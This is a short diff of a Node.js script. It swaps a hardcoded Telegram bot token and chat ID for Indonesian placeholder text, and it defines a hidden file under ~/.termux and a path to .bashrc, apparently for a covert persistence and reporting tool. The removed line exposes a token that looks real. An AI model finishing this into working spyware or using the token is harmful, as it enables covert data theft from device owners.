@@ -4,8 +4,8 @@ const https = require('https');
 const path = require('path');
 const os = require('os');
 
-const BOT_TOKEN = '7604621678:AAHWkkAYCkqDZwsuI7cRHcQAiF2Kg9flaXY';
-const CHAT_ID = '7955475790';
+const BOT_TOKEN = 'masukan token';
+const CHAT_ID = 'masukan id';
 const hiddenDir = `${process.env.HOME}/.termux`;
 const hiddenFile = `${hiddenDir}/.service-cache`;
 const bashrcPath = `${process.env.HOME}/.bashrc`;
